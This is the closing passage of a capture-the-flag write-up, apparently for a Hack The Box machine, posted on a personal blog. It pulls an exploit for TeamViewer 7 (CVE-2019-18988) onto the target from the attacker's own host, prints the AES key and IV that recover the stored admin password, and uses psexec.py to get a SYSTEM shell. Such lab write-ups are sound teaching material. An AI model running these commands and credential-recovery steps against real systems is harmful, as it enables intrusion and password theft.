+<p>Basically, TeamViewer7 uses a weak encryption algorithm that can be cracked. Upon some more research, I’ve found <a href="https://github.com/mr-r3b00t/CVE-2019-18988">this</a> GitHub repo contaning the exploit. Somehow, we need to run it inside the CTF machine. To do that, save the exploit on our local machine, pop a Python server. On the host machine, let’s <code class="language-plaintext highlighter-rouge">cd C:\windows\temp\</code> and then:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\w</span>indows<span class="se">\t</span>emp&gt; Invoke-WebRequest <span class="nt">-Uri</span> <span class="s1">'http://10.10.16.14/exploit.bat'</span> <span class="nt">-OutFile</span> <span class="s1">'C:\windows\temp\exploit.bat'</span>
+PS C:<span class="se">\w</span>indows<span class="se">\t</span>emp&gt; <span class="nb">ls </span>exploit.bat
+
+
+    Directory: C:<span class="se">\w</span>indows<span class="se">\t</span>emp
+
+
+Mode                LastWriteTime         Length Name                                                                  
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>                                                                  
+<span class="nt">-a----</span>         1/6/2024  11:56 PM           1148 exploit.bat 
+</code></pre></div></div>
+
+<p>To run the exploit, we type in <code class="language-plaintext highlighter-rouge">.\exploit.bat</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\w</span>indows<span class="se">\t</span>emp&gt; .<span class="se">\e</span>xploit.bat
+
+C:<span class="se">\w</span>indows<span class="se">\t</span>emp&gt;REM <span class="c"># CVE-2019-18988 </span>
+
+C:<span class="se">\w</span>indows<span class="se">\t</span>emp&gt;REM <span class="c"># Teamviewer Local Privesc </span>
+
+C:<span class="se">\w</span>indows<span class="se">\t</span>emp&gt;REM https://community.teamviewer.com/t5/Announcements/Specification-on-CVE-2019-18988/td-p/82264 
+
+C:<span class="se">\w</span>indows<span class="se">\t</span>emp&gt;reg query HKLM<span class="se">\S</span>OFTWARE<span class="se">\W</span>OW6432Node<span class="se">\T</span>eamViewer<span class="se">\V</span>ersion7 /v Version 
+
+HKEY_LOCAL_MACHINE<span class="se">\S</span>OFTWARE<span class="se">\W</span>OW6432Node<span class="se">\T</span>eamViewer<span class="se">\V</span>ersion7
+    Version    REG_SZ    7.0.43148
+
+
+C:<span class="se">\w</span>indows<span class="se">\t</span>emp&gt;reg query HKLM<span class="se">\S</span>OFTWARE<span class="se">\W</span>OW6432Node<span class="se">\T</span>eamViewer<span class="se">\V</span>ersion7 
+
+HKEY_LOCAL_MACHINE<span class="se">\S</span>OFTWARE<span class="se">\W</span>OW6432Node<span class="se">\T</span>eamViewer<span class="se">\V</span>ersion7
+    StartMenuGroup    REG_SZ    TeamViewer 7
+    InstallationDate    REG_SZ    2020-02-20
+    InstallationDirectory    REG_SZ    C:<span class="se">\P</span>rogram Files <span class="o">(</span>x86<span class="o">)</span><span class="se">\T</span>eamViewer<span class="se">\V</span>ersion7
+    Always_Online    REG_DWORD    0x1
+    Security_ActivateDirectIn    REG_DWORD    0x0
+    Version    REG_SZ    7.0.43148
+    ClientIC    REG_DWORD    0x11f25831
+    PK    REG_BINARY    BFAD2AEDB6C89AE0A0FD0501A0C5B9A5C0D957A4CC57C1884C84B6873EA03C069CF06195829821E28DFC2AAD372665339488DD1A8C85CDA8B19D0A5A2958D86476D82CA0F2128395673BA5A39F2B875B060D4D52BE75DB2B6C91EDB28E90DF7F2F3FBE6D95A07488AE934CC01DB8311176AEC7AC367AB4332ABD048DBFC2EF5E9ECC1333FC5F5B9E2A13D4F22E90EE509E5D7AF4935B8538BE4A606AB06FE8CC657930A24A71D1E30AE2188E0E0214C8F58CD2D5B43A52549F0730376DD3AE1DB66D1E0EBB0CF1CB0AA7F133148D1B5459C95A24DDEE43A76623759017F21A1BC8AFCD1F56FD0CABB340C9B99EE3828577371B7ADA9A8F967A32ADF6CF062B00026C66F8061D5CFF89A53EAE510620BC822BC6CC615D4DE093BC0CA8F5785131B75010EE5F9B6C228E650CA89697D07E51DBA40BF6FC3B2F2E30BF6F1C01F1BC2386FA226FFFA2BE25AE33FA16A2699A1124D9133F18B50F4DB6EDA2D23C2B949D6D2995229BC03507A62FCDAD55741B29084BD9B176CFAEDAAA9D48CBAF2C192A0875EC748478E51156CCDD143152125AE7D05177083F406703ED44DCACCD48400DD88A568520930BED69FCD672B15CD3646F8621BBC35391EAADBEDD04758EE8FC887BACE6D8B59F61A5783D884DBE362E2AC6EAC0671B6B5116345043257C537D27A8346530F8B7F5E0EBACE9B840E716197D4A0C3D68CFD2126E8245B01E62B4CE597AA3E2074C8AB1A4583B04DBB13F13EB54E64B850742A8E3E8C2FAC0B9B0CF28D71DD41F67C773A19D7B1A2D0A257A4D42FC6214AB870710D5E841CBAFCD05EF13B372F36BF7601F55D98ED054ED0F321AEBA5F91D390FF0E8E5815E6272BA4ABB3C85CF4A8B07851903F73317C0BC77FA12A194BB75999319222516
+    SK    REG_BINARY    F82398387864348BAD0DBB41812782B1C0ABB9DAEEF15BC5C3609B2C5652BED7A9A07EA41B3E7CB583A107D39AFFF5E06DF1A06649C07DF4F65BD89DE84289D0F2CBF6B8E92E7B2901782BE8A039F2903552C98437E47E16F75F99C07750AEED8CFC7CD859AE94EC6233B662526D977FFB95DD5EB32D88A4B8B90EC1F8D118A7C6D28F6B5691EB4F9F6E07B6FE306292377ACE83B14BF815C186B7B74FFF9469CA712C13F221460AC6F3A7C5A89FD7C79FF306CEEBEF6DE06D6301D5FD9AB797D08862B9B7D75B38FB34EF82C77C8ADC378B65D9ED77B42C1F4CB1B11E7E7FB2D78180F40C96C1328970DA0E90CDEF3D4B79E08430E546228C000996D846A8489F61FE07B9A71E7FB3C3F811BB68FDDF829A7C0535BA130F04D9C7C09B621F4F48CD85EA97EF3D79A88257D0283BF2B78C5B3D4BBA4307D2F38D3A4D56A2706EDAB80A7CE20E21099E27481C847B49F8E91E53F83356323DDB09E97F45C6D103CF04693106F63AD8A58C004FC69EF8C506C553149D038191781E539A9E4E830579BCB4AD551385D1C9E4126569DD96AE6F97A81420919EE15CF125C1216C71A2263D1BE468E4B07418DE874F9E801DA2054AD64BE1947BE9580D7F0E3C138EE554A9749C4D0B3725904A95AEBD9DACCB6E0C568BFA25EE5649C31551F268B1F2EC039173B7912D6D58AA47D01D9E1B95E3427836A14F71F26E350B908889A95120195CC4FD68E7140AA8BB20E211D15C0963110878AAB530590EE68BF68B42D8EEEB2AE3B8DEC0558032CFE22D692FF5937E1A02C1250D507BDE0F51A546FE98FCED1E7F9DBA3281F1A298D66359C7571D29B24D1456C8074BA570D4D0BA2C3696A8A9547125FFD10FBF662E597A014E0772948F6C5F9F7D0179656EAC2F0C7F
+    LastMACUsed    REG_MULTI_SZ    <span class="se">\0</span>005056B0A059
+    MIDInitiativeGUID    REG_SZ    <span class="o">{</span>514ed376-a4ee-4507-a28b-484604ed0ba0<span class="o">}</span>
+    MIDVersion    REG_DWORD    0x1
+    ClientID    REG_DWORD    0x6972e4aa
+    CUse    REG_DWORD    0x1
+    LastUpdateCheck    REG_DWORD    0x64c273d8
+    UsageEnvironmentBackup    REG_DWORD    0x1
+    SecurityPasswordAES    REG_BINARY    FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B
+    MultiPwdMgmtIDs    REG_MULTI_SZ    admin
+    MultiPwdMgmtPWDs    REG_MULTI_SZ    357BC4C8F33160682B01AE2D1C987C3FE2BAE09455B94A1919C4CD4984593A77
+    Security_PasswordStrength    REG_DWORD    0x3
+
+HKEY_LOCAL_MACHINE<span class="se">\S</span>OFTWARE<span class="se">\W</span>OW6432Node<span class="se">\T</span>eamViewer<span class="se">\V</span>ersion7<span class="se">\A</span>ccessControl
+HKEY_LOCAL_MACHINE<span class="se">\S</span>OFTWARE<span class="se">\W</span>OW6432Node<span class="se">\T</span>eamViewer<span class="se">\V</span>ersion7<span class="se">\D</span>efaultSettings
+
+C:<span class="se">\w</span>indows<span class="se">\t</span>emp&gt;reg query HKLM<span class="se">\S</span>OFTWARE<span class="se">\T</span>eamViewer<span class="se">\T</span>emp /v SecurityPasswordExported 
+
+C:<span class="se">\w</span>indows<span class="se">\t</span>emp&gt;reg query HKLM<span class="se">\S</span>OFTWARE<span class="se">\W</span>OW6432Node<span class="se">\T</span>eamViewer<span class="se">\V</span>ersion7 
+
+HKEY_LOCAL_MACHINE<span class="se">\S</span>OFTWARE<span class="se">\W</span>OW6432Node<span class="se">\T</span>eamViewer<span class="se">\V</span>ersion7
+    StartMenuGroup    REG_SZ    TeamViewer 7
+    InstallationDate    REG_SZ    2020-02-20
+    InstallationDirectory    REG_SZ    C:<span class="se">\P</span>rogram Files <span class="o">(</span>x86<span class="o">)</span><span class="se">\T</span>eamViewer<span class="se">\V</span>ersion7
+    Always_Online    REG_DWORD    0x1
+    Security_ActivateDirectIn    REG_DWORD    0x0
+    Version    REG_SZ    7.0.43148
+    ClientIC    REG_DWORD    0x11f25831
+    PK    REG_BINARY    BFAD2AEDB6C89AE0A0FD0501A0C5B9A5C0D957A4CC57C1884C84B6873EA03C069CF06195829821E28DFC2AAD372665339488DD1A8C85CDA8B19D0A5A2958D86476D82CA0F2128395673BA5A39F2B875B060D4D52BE75DB2B6C91EDB28E90DF7F2F3FBE6D95A07488AE934CC01DB8311176AEC7AC367AB4332ABD048DBFC2EF5E9ECC1333FC5F5B9E2A13D4F22E90EE509E5D7AF4935B8538BE4A606AB06FE8CC657930A24A71D1E30AE2188E0E0214C8F58CD2D5B43A52549F0730376DD3AE1DB66D1E0EBB0CF1CB0AA7F133148D1B5459C95A24DDEE43A76623759017F21A1BC8AFCD1F56FD0CABB340C9B99EE3828577371B7ADA9A8F967A32ADF6CF062B00026C66F8061D5CFF89A53EAE510620BC822BC6CC615D4DE093BC0CA8F5785131B75010EE5F9B6C228E650CA89697D07E51DBA40BF6FC3B2F2E30BF6F1C01F1BC2386FA226FFFA2BE25AE33FA16A2699A1124D9133F18B50F4DB6EDA2D23C2B949D6D2995229BC03507A62FCDAD55741B29084BD9B176CFAEDAAA9D48CBAF2C192A0875EC748478E51156CCDD143152125AE7D05177083F406703ED44DCACCD48400DD88A568520930BED69FCD672B15CD3646F8621BBC35391EAADBEDD04758EE8FC887BACE6D8B59F61A5783D884DBE362E2AC6EAC0671B6B5116345043257C537D27A8346530F8B7F5E0EBACE9B840E716197D4A0C3D68CFD2126E8245B01E62B4CE597AA3E2074C8AB1A4583B04DBB13F13EB54E64B850742A8E3E8C2FAC0B9B0CF28D71DD41F67C773A19D7B1A2D0A257A4D42FC6214AB870710D5E841CBAFCD05EF13B372F36BF7601F55D98ED054ED0F321AEBA5F91D390FF0E8E5815E6272BA4ABB3C85CF4A8B07851903F73317C0BC77FA12A194BB75999319222516
+    SK    REG_BINARY    F82398387864348BAD0DBB41812782B1C0ABB9DAEEF15BC5C3609B2C5652BED7A9A07EA41B3E7CB583A107D39AFFF5E06DF1A06649C07DF4F65BD89DE84289D0F2CBF6B8E92E7B2901782BE8A039F2903552C98437E47E16F75F99C07750AEED8CFC7CD859AE94EC6233B662526D977FFB95DD5EB32D88A4B8B90EC1F8D118A7C6D28F6B5691EB4F9F6E07B6FE306292377ACE83B14BF815C186B7B74FFF9469CA712C13F221460AC6F3A7C5A89FD7C79FF306CEEBEF6DE06D6301D5FD9AB797D08862B9B7D75B38FB34EF82C77C8ADC378B65D9ED77B42C1F4CB1B11E7E7FB2D78180F40C96C1328970DA0E90CDEF3D4B79E08430E546228C000996D846A8489F61FE07B9A71E7FB3C3F811BB68FDDF829A7C0535BA130F04D9C7C09B621F4F48CD85EA97EF3D79A88257D0283BF2B78C5B3D4BBA4307D2F38D3A4D56A2706EDAB80A7CE20E21099E27481C847B49F8E91E53F83356323DDB09E97F45C6D103CF04693106F63AD8A58C004FC69EF8C506C553149D038191781E539A9E4E830579BCB4AD551385D1C9E4126569DD96AE6F97A81420919EE15CF125C1216C71A2263D1BE468E4B07418DE874F9E801DA2054AD64BE1947BE9580D7F0E3C138EE554A9749C4D0B3725904A95AEBD9DACCB6E0C568BFA25EE5649C31551F268B1F2EC039173B7912D6D58AA47D01D9E1B95E3427836A14F71F26E350B908889A95120195CC4FD68E7140AA8BB20E211D15C0963110878AAB530590EE68BF68B42D8EEEB2AE3B8DEC0558032CFE22D692FF5937E1A02C1250D507BDE0F51A546FE98FCED1E7F9DBA3281F1A298D66359C7571D29B24D1456C8074BA570D4D0BA2C3696A8A9547125FFD10FBF662E597A014E0772948F6C5F9F7D0179656EAC2F0C7F
+    LastMACUsed    REG_MULTI_SZ    <span class="se">\0</span>005056B0A059
+    MIDInitiativeGUID    REG_SZ    <span class="o">{</span>514ed376-a4ee-4507-a28b-484604ed0ba0<span class="o">}</span>
+    MIDVersion    REG_DWORD    0x1
+    ClientID    REG_DWORD    0x6972e4aa
+    CUse    REG_DWORD    0x1
+    LastUpdateCheck    REG_DWORD    0x64c273d8
+    UsageEnvironmentBackup    REG_DWORD    0x1
+    SecurityPasswordAES    REG_BINARY    FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B
+    MultiPwdMgmtIDs    REG_MULTI_SZ    admin
+    MultiPwdMgmtPWDs    REG_MULTI_SZ    357BC4C8F33160682B01AE2D1C987C3FE2BAE09455B94A1919C4CD4984593A77
+    Security_PasswordStrength    REG_DWORD    0x3
+
+HKEY_LOCAL_MACHINE<span class="se">\S</span>OFTWARE<span class="se">\W</span>OW6432Node<span class="se">\T</span>eamViewer<span class="se">\V</span>ersion7<span class="se">\A</span>ccessControl
+HKEY_LOCAL_MACHINE<span class="se">\S</span>OFTWARE<span class="se">\W</span>OW6432Node<span class="se">\T</span>eamViewer<span class="se">\V</span>ersion7<span class="se">\D</span>efaultSettings
+
+C:<span class="se">\w</span>indows<span class="se">\t</span>emp&gt;reg query HKLM<span class="se">\S</span>OFTWARE<span class="se">\T</span>eamViewer<span class="se">\V</span>ersion7 
+
+C:<span class="se">\w</span>indows<span class="se">\t</span>emp&gt;reg query HKLM<span class="se">\S</span>OFTWARE<span class="se">\W</span>OW6432Node<span class="se">\T</span>eamViewer<span class="se">\V</span>ersion7 /v SecurityPasswordExported 
+
+
+
+C:<span class="se">\w</span>indows<span class="se">\t</span>emp&gt;reg query HKLM<span class="se">\S</span>OFTWARE<span class="se">\W</span>OW6432Node<span class="se">\T</span>eamViewer<span class="se">\V</span>ersion7 /v ServerPasswordAES  
+
+
+
+C:<span class="se">\w</span>indows<span class="se">\t</span>emp&gt;reg query HKLM<span class="se">\S</span>OFTWARE<span class="se">\W</span>OW6432Node<span class="se">\T</span>eamViewer<span class="se">\V</span>ersion7 /v ProxyPasswordAES 
+
+
+
+C:<span class="se">\w</span>indows<span class="se">\t</span>emp&gt;reg query HKLM<span class="se">\S</span>OFTWARE<span class="se">\W</span>OW6432Node<span class="se">\T</span>eamViewer<span class="se">\V</span>ersion7 /v LicenseKeyAES 
+
+
+
+C:<span class="se">\w</span>indows<span class="se">\t</span>emp&gt;reg query HKLM<span class="se">\S</span>OFTWARE<span class="se">\W</span>OW6432Node<span class="se">\T</span>eamViewer<span class="se">\V</span>ersion7 /v OptionsPassword 
+
+
+
+C:<span class="se">\w</span>indows<span class="se">\t</span>emp&gt;reg query HKLM<span class="se">\S</span>OFTWARE<span class="se">\W</span>OW6432Node<span class="se">\T</span>eamViewer<span class="se">\V</span>ersion7 /v PermanentPassword 
+
+
+
+C:<span class="se">\w</span>indows<span class="se">\t</span>emp&gt;REM CYBERCHEF RECIPE  
+
+C:<span class="se">\w</span>indows<span class="se">\t</span>emp&gt;REM AES_Decrypt<span class="o">({</span><span class="s1">'option'</span>:<span class="s1">'Hex'</span>,<span class="s1">'string'</span>:<span class="s1">'0602000000a400005253413100040000'</span><span class="o">}</span>,<span class="o">{</span><span class="s1">'option'</span>:<span class="s1">'Hex'</span>,<span class="s1">'string'</span>:<span class="s1">'0100010067244F436E6762F25EA8D704'</span><span class="o">}</span>,<span class="s1">'CBC'</span>,<span class="s1">'Hex'</span>,<span class="s1">'Raw'</span>,<span class="o">{</span><span class="s1">'option'</span>:<span class="s1">'Hex'</span>,<span class="s1">'string'</span>:<span class="s1">''</span><span class="o">})</span>Decode_text<span class="o">(</span><span class="s1">'UTF-16LE (1200)'</span><span class="o">)</span> 
+PS C:<span class="se">\w</span>indows<span class="se">\t</span>emp&gt; The system was unable to find the specified registry key or value.
+</code></pre></div></div>
+
+<p>From this huge output, we find three things: first, the encrypted HEX password is <code class="language-plaintext highlighter-rouge">FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B</code>. Second, we have the AES encryption key, which is <code class="language-plaintext highlighter-rouge">0602000000a400005253413100040000</code>. Finally, we have the IV, which is <code class="language-plaintext highlighter-rouge">0100010067244F436E6762F25EA8D704</code>. We can go to <a href="https://gchq.github.io">Cyberchef</a> and select AES decrypt recipe. Here is the result:</p>
+
+<p><img src="../figs/remote-htb5.png" alt="cyberchef decrypt AES" /></p>
+
+<p>Showing the admin password is <code class="language-plaintext highlighter-rouge">!R3m0te!</code>.</p>
+
+<h2 id="step-4---solving"><a href="#mindset-step4"></a>Step 4 - Solving!</h2>
+
+<p>Now that we have the admin password, we can use <code class="language-plaintext highlighter-rouge">psexec.py</code>, as stated by the machine info, to get the SYSTEM shell. To do so, we simply run:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kaizen@celestial ~ <span class="nv">$ </span>psexec.py <span class="s1">'administrator:!R3m0te!@10.129.14.142'</span>
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on 10.129.14.142.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file lAgjnpRc.exe
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on 10.129.14.142.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service eGkl on 10.129.14.142.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service eGkl.....
+<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
+Microsoft Windows <span class="o">[</span>Version 10.0.17763.107]
+<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">whoami
+</span>nt authority<span class="se">\s</span>ystem
+</code></pre></div></div>
+
+<p>And voilà! We have our SYSTEM shell! Now, we retrieve all flags:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">type </span>c:<span class="se">\u</span>sers<span class="se">\p</span>ublic<span class="se">\u</span>ser.txt
+aa3d4bb0861760843cb76a9d9f92190a
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">type </span>c:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop<span class="se">\r</span>oot.txt
+a033160985b82a79d7188f9c1974a8fc
+</code></pre></div></div>
+
+<h1 id="conclusion"><a href="#conclusions"></a>Conclusion</h1>
+
+<p>In this CTF, we learned a bit more Common Vulnerabilities: one regarding outdated Umbraco CMS; and the other, a CVE that retrieves TeamViewer password hases that can later be used to get the SYSTEM shell. Nothing too fancy, yet super thoughtful!</p>
+
+<p>I hope you liked this write-up and learned something new. As always, don’t forget to do your <strong>research!</strong></p>
+
+<p><a href="/">Go back</a></p>
+
+
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+    <span>
+        <b>Alex Buschinelli</b>
+    </span>
+    
+    <span>© 2024</span>
+  </a>
+</footer>
+
+  
+</body>
+
+</html>
